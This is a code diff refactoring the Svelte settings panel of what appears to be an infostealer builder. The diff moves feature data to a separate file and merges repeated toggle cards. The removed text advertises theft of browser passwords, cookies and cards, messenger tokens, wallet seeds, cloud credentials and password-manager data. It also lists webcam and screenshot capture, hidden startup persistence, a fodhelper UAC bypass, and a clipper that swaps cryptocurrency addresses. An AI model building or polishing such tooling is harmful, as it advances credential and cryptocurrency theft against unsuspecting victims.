@@ -9,28 +9,21 @@
   } from "$lib/components/ui/accordion";
   import {
     Dialog,
-    DialogClose,
     DialogContent,
     DialogDescription,
-    DialogFooter,
     DialogHeader,
-    DialogOverlay,
     DialogPortal,
     DialogTitle,
     DialogTrigger,
+    DialogOverlay,
   } from "$lib/components/ui/dialog";
   import { Label } from "$lib/components/ui/label";
   import { Switch } from "$lib/components/ui/switch";
+  import { featureLinks, detailSections, type FeatureDetail } from "./feature-data";
 
   type Category = {
     readonly id: string;
     readonly label: string;
-  };
-
-  type FeatureDetail = {
-    title: string;
-    summary: string;
-    items?: string[];
   };
 
   type Props = {
@@ -73,258 +66,19 @@
     onToggleClipper = () => undefined,
   }: Props = $props();
 
-    const featureLinks: Record<string, string> = {
-    "Element": "https://element.io",
-    ICQ: "https://icq.com",
-    Signal: "https://signal.org",
-    "Slack": "https://slack.com",
-    Skype: "https://www.skype.com",
-    "Telegram": "https://desktop.telegram.org",
-    "Discord": "https://discord.com",
-    Tox: "https://tox.chat",
-    Viber: "https://www.viber.com",
-    "WhatsApp": "https://www.whatsapp.com/download",
-    "Messenger": "https://www.messenger.com",
-    "WeChat": "https://www.wechat.com",
-    "Wire": "https://wire.com",
-    Pidgin: "https://pidgin.im",
-    "Psi": "https://psi-im.org",
-    Outlook: "https://www.microsoft.com/outlook",
-    Thunderbird: "https://www.thunderbird.net",
-    Mailbird: "https://www.getmailbird.com",
-    Mailspring: "https://www.getmailspring.com",
-    Ethereum: "https://ethereum.org/en/wallets/",
-    "Electrum Wallets": "https://electrum.org",
-    Dash: "https://www.dash.org",
-    Bytecoin: "https://bytecoin.org",
-    Bitcoin: "https://bitcoin.org/en/bitcoin-core/",
-    "Atomic Wallet": "https://atomicwallet.io",
-    Armory: "https://www.bitcoinarmory.com",
-    Exodus: "https://www.exodus.com",
-    Litecoin: "https://litecoin.com",
-    Monero: "https://www.getmonero.org",
-    Zcash: "https://z.cash",
-    Coinomi: "https://www.coinomi.com",
-    Guarda: "https://guarda.com",
-    Zephyr: "https://zephyrwallet.io",
-    "Trust Wallet": "https://www.trustwallet.com",
-    "Ledger Live": "https://www.ledger.com/ledger-live",
-    Phantom: "https://phantom.app",
-    MetaMask: "https://metamask.io",
-    "TronLink": "https://www.tronlink.org",
-    "Coinbase Wallet": "https://www.coinbase.com/wallet",
-    "Ronin": "https://roninwallet.io",
-    "Binance Chain": "https://www.bnbchain.org",
-    "Jaxx Liberty": "https://jaxx.io",
-    "Google Chrome": "https://www.google.com/chrome",
-    "Microsoft Edge": "https://www.microsoft.com/edge",
-    Brave: "https://brave.com",
-    Opera: "https://www.opera.com",
-    "Mozilla Firefox": "https://www.mozilla.org/firefox",
-    SeaMonkey: "https://www.seamonkey-project.org",
-    Waterfox: "https://www.waterfox.net",
-    "Pale Moon": "https://www.palemoon.org",
-    "Yandex": "https://browser.yandex.com",
-    "360": "https://browser.360.cn",
-    "QQ": "https://browser.qq.com",
-    "Cốc Cốc": "https://coccoc.com",
-    "Naver Whale": "https://whale.naver.com",
-    "Arc": "https://arc.net",
-    Vivaldi: "https://vivaldi.com",
-    Chromium: "https://www.chromium.org",
-    NordVPN: "https://nordvpn.com",
-    ExpressVPN: "https://www.expressvpn.com",
-    TunnelBear: "https://www.tunnelbear.com",
-    WireGuard: "https://www.wireguard.com",
-    OpenVPN: "https://openvpn.net",
-    ProtonVPN: "https://proton.me/vpn",
-    Surfshark: "https://surfshark.com",
-    Steam: "https://store.steampowered.com",
-    "Epic Games Launcher": "https://www.epicgames.com/store",
-    "Battle.net": "https://www.blizzard.com",
-    "Riot Client": "https://www.riotgames.com",
-    "Ubisoft Connect": "https://www.ubisoft.com",
-    "EA Desktop": "https://www.ea.com/ea-app",
-    "Roblox": "https://www.roblox.com",
-    "Minecraft": "https://www.minecraft.net",
-    "AWS": "https://aws.amazon.com",
-    "Azure": "https://azure.microsoft.com",
-    "GCP": "https://cloud.google.com",
-    "Kubernetes": "https://kubernetes.io",
-    "Docker": "https://www.docker.com",
-    "Terraform": "https://www.terraform.io",
-    "Git": "https://git-scm.com",
-    "VS Code": "https://code.visualstudio.com",
-    "Postman": "https://www.postman.com",
-    "FileZilla": "https://filezilla-project.org",
-    "WinSCP": "https://winscp.net",
-    "Cyberduck": "https://cyberduck.io",
-    "Bitwarden": "https://bitwarden.com",
-    "1Password": "https://1password.com",
-    "Dashlane": "https://www.dashlane.com",
-    "LastPass": "https://www.lastpass.com",
-    "KeePassXC": "https://keepassxc.org",
-    "NordPass": "https://nordpass.com",
-    "RoboForm": "https://www.roboform.com",
-    "Keeper": "https://www.keepersecurity.com",
-  };
-const slugify = (value: string) =>
+  const slugify = (value: string) =>
     value
       .toLowerCase()
       .replace(/[^a-z0-9]+/g, "-")
       .replace(/^-|-$/g, "");
+
   const iconSrc = (value: string) => `/logos/${slugify(value)}.svg`;
+
   const handleFeatureClick = (label: string) => {
     const link = featureLinks[label];
     if (!link) return;
     invoke("plugin:opener|open_url", { url: link }).catch(console.error);
   };
-
-  const detailSections: FeatureDetail[] = [
-    {
-      title: "Browsers",
-      summary:
-        "Collects passwords, cookies, history, bookmarks, autofill, and credit card data from Chromium and Gecko-based browsers.",
-      items: [
-        "Google Chrome",
-        "Microsoft Edge",
-        "Mozilla Firefox",
-        "Opera",
-        "Brave",
-        "Vivaldi",
-        "Yandex",
-        "360",
-        "QQ",
-        "Cốc Cốc",
-        "Naver Whale",
-        "SeaMonkey",
-        "Waterfox",
-        "Pale Moon",
-        "Arc",
-        "Chromium",
-      ],
-    },
-    {
-      title: "Messengers",
-      summary: "Grabs tokens, sessions, and local databases from desktop messengers and communication apps.",
-      items: [
-        "Telegram",
-        "Discord",
-        "WhatsApp",
-        "Messenger",
-        "WeChat",
-        "Signal",
-        "Slack",
-        "Skype",
-        "Viber",
-        "Wire",
-        "ICQ",
-        "Tox",
-        "Pidgin",
-        "Psi",
-        "Element",
-      ],
-    },
-    {
-      title: "Wallets",
-      summary: "Extracts keys, seeds, and session metadata from desktop wallets and browser extensions.",
-      items: [
-        "Exodus",
-        "Atomic Wallet",
-        "Electrum Wallets",
-        "Ethereum",
-        "Jaxx Liberty",
-        "Coinomi",
-        "Guarda",
-        "Zephyr",
-        "Dash",
-        "Monero",
-        "Bitcoin",
-        "Armory",
-        "Bytecoin",
-        "Zcash",
-        "Trust Wallet",
-        "MetaMask",
-        "Phantom",
-        "TronLink",
-        "Coinbase Wallet",
-        "Ronin",
-        "Binance Chain",
-      ],
-    },
-    {
-      title: "DevOps & Cloud",
-      summary: "Recovers credentials and configuration for cloud providers, infrastructure, and version control.",
-      items: ["AWS", "Azure", "GCP", "Kubernetes", "Docker", "Terraform", "Git"],
-    },
-    {
-      title: "Developer Tools",
-      summary: "Extracts settings, sessions, and bookmarks from IDEs, API clients, and FTP/SSH tools.",
-      items: ["VS Code", "Postman", "FileZilla", "WinSCP", "Cyberduck"],
-    },
-    {
-      title: "Password Managers",
-      summary: "Extracts local databases and extension data from standalone and browser-based password managers.",
-      items: [
-        "Bitwarden",
-        "1Password",
-        "Dashlane",
-        "LastPass",
-        "KeePassXC",
-        "NordPass",
-        "RoboForm",
-        "Keeper",
-      ],
-    },
-    {
-      title: "Gaming",
-      summary: "Scrapes login tokens and session data from major gaming platforms and Minecraft variants.",
-      items: [
-        "Steam",
-        "Roblox",
-        "Minecraft",
-        "Ubisoft Connect",
-        "EA Desktop",
-        "Epic Games Launcher",
-        "Battle.net",
-        "Riot Client",
-      ],
-    },
-    {
-      title: "VPNs & Services",
-      summary: "Gathers configuration files and session data from common VPN clients.",
-      items: ["NordVPN", "ExpressVPN", "TunnelBear", "WireGuard", "OpenVPN", "ProtonVPN", "Surfshark"],
-    },
-    {
-      title: "Email Clients",
-      summary: "Extracts profiles, cached mailboxes, and configuration from widely used email clients.",
-      items: ["Outlook", "Thunderbird", "Mailbird", "Mailspring"],
-    },
-    {
-      title: "Screenshots",
-      summary: "Captures every active monitor in the Windows session as PNG artifacts.",
-    },
-    {
-      title: "Webcam",
-      summary: "Snapshots one frame per detected webcam device.",
-    },
-    {
-      title: "Clipboard",
-      summary: "Logs plaintext and image data currently stored in the Windows clipboard.",
-    },
-    {
-      title: "Persistence",
-      summary: "Installs the agent to a hidden directory and registers for startup to ensure survival across reboots.",
-    },
-    {
-      title: "UAC Bypass",
-      summary: "Attempts to escalate to administrative privileges via fodhelper.exe registry hijacking.",
-    },
-    {
-      title: "Active Clipper",
-      summary: "Monitors clipboard for cryptocurrency addresses and replaces them with your own in real-time.",
-    },
-  ];
 
   const handleCategoryToggle = (id: string) => {
     const nextValue = !categoryState[id];
@@ -334,7 +88,43 @@ const slugify = (value: string) =>
     }
     toggleCategory(id, nextValue);
   };
+
+  const coreFeatures = $derived([
+    { label: "Screenshot", checked: captureScreenshots, toggle: onToggleScreenshots },
+    { label: "Webcam", checked: captureWebcams, toggle: onToggleWebcams },
+    { label: "Clipboard", checked: captureClipboard, toggle: onToggleClipboard },
+    { label: "Persistence", checked: persistence, toggle: onTogglePersistence },
+    { label: "UAC Bypass", checked: uacBypass, toggle: onToggleUacBypass },
+    { label: "Clipper", checked: clipper, toggle: onToggleClipper },
+  ]);
 </script>
+
+{#snippet featureCard(label: string, checked: boolean, toggle: () => void, switchAttr: string = "data-feature-switch")}
+  <div
+    class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
+    role="button"
+    tabindex="0"
+    onclick={(event) => {
+      const target = event.target as HTMLElement | null;
+      if (target?.closest?.(`[${switchAttr}]`)) return;
+      toggle();
+    }}
+    onkeydown={(event) => {
+      if (event.key === "Enter" || event.key === " ") {
+        event.preventDefault();
+        toggle();
+      }
+    }}
+  >
+    <Label class="text-sm cursor-pointer">{label}</Label>
+    <Switch
+      {...{ [switchAttr]: true }}
+      class="cursor-pointer"
+      {checked}
+      onCheckedChange={toggle}
+    />
+  </div>
+{/snippet}
 
 <div class="space-y-4">
   <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
@@ -422,7 +212,7 @@ const slugify = (value: string) =>
           }
         }}
       >
-        <Label class="text-sm">{category.label}</Label>
+        <Label class="text-sm cursor-pointer">{category.label}</Label>
         <Switch
           id={`category-${category.id}`}
           data-category-switch
@@ -439,131 +229,8 @@ const slugify = (value: string) =>
         />
       </div>
     {/each}
-    <div
-      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
-      role="button"
-      tabindex="0"
-      onclick={(event) => {
-        const target = event.target as HTMLElement | null;
-        if (target?.closest?.("[data-feature-switch]")) return;
-        onToggleScreenshots();
-      }}
-      onkeydown={(event) => {
-        if (event.key === "Enter" || event.key === " ") {
-          event.preventDefault();
-          onToggleScreenshots();
-        }
-      }}
-    >
-      <div class="space-y-0.5">
-        <Label class="text-sm">Screenshot</Label>
-      </div>
-      <Switch data-feature-switch class="cursor-pointer" checked={captureScreenshots} />
-    </div>
-    <div
-      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
-      role="button"
-      tabindex="0"
-      onclick={(event) => {
-        const target = event.target as HTMLElement | null;
-        if (target?.closest?.("[data-feature-switch]")) return;
-        onToggleWebcams();
-      }}
-      onkeydown={(event) => {
-        if (event.key === "Enter" || event.key === " ") {
-          event.preventDefault();
-          onToggleWebcams();
-        }
-      }}
-    >
-      <div class="space-y-0.5">
-        <Label class="text-sm">Webcam</Label>
-      </div>
-      <Switch data-feature-switch class="cursor-pointer" checked={captureWebcams} />
-    </div>
-    <div
-      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
-      role="button"
-      tabindex="0"
-      onclick={(event) => {
-        const target = event.target as HTMLElement | null;
-        if (target?.closest?.("[data-feature-switch]")) return;
-        onToggleClipboard();
-      }}
-      onkeydown={(event) => {
-        if (event.key === "Enter" || event.key === " ") {
-          event.preventDefault();
-          onToggleClipboard();
-        }
-      }}
-    >
-      <div class="space-y-0.5">
-        <Label class="text-sm">Clipboard</Label>
-      </div>
-      <Switch data-feature-switch class="cursor-pointer" checked={captureClipboard} />
-    </div>
-    <div
-      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
-      role="button"
-      tabindex="0"
-      onclick={(event) => {
-        const target = event.target as HTMLElement | null;
-        if (target?.closest?.("[data-feature-switch]")) return;
-        onTogglePersistence();
-      }}
-      onkeydown={(event) => {
-        if (event.key === "Enter" || event.key === " ") {
-          event.preventDefault();
-          onTogglePersistence();
-        }
-      }}
-    >
-      <div class="space-y-0.5">
-        <Label class="text-sm">Persistence</Label>
-      </div>
-      <Switch data-feature-switch class="cursor-pointer" checked={persistence} />
-    </div>
-    <div
-      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
-      role="button"
-      tabindex="0"
-      onclick={(event) => {
-        const target = event.target as HTMLElement | null;
-        if (target?.closest?.("[data-feature-switch]")) return;
-        onToggleUacBypass();
-      }}
-      onkeydown={(event) => {
-        if (event.key === "Enter" || event.key === " ") {
-          event.preventDefault();
-          onToggleUacBypass();
-        }
-      }}
-    >
-      <div class="space-y-0.5">
-        <Label class="text-sm">UAC Bypass</Label>
-      </div>
-      <Switch data-feature-switch class="cursor-pointer" checked={uacBypass} />
-    </div>
-    <div
-      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
-      role="button"
-      tabindex="0"
-      onclick={(event) => {
-        const target = event.target as HTMLElement | null;
-        if (target?.closest?.("[data-feature-switch]")) return;
-        onToggleClipper();
-      }}
-      onkeydown={(event) => {
-        if (event.key === "Enter" || event.key === " ") {
-          event.preventDefault();
-          onToggleClipper();
-        }
-      }}
-    >
-      <div class="space-y-0.5">
-        <Label class="text-sm">Active Clipper</Label>
-      </div>
-      <Switch data-feature-switch class="cursor-pointer" checked={clipper} />
-    </div>
+    {#each coreFeatures as feature}
+      {@render featureCard(feature.label, feature.checked, feature.toggle)}
+    {/each}
   </div>
 </div>
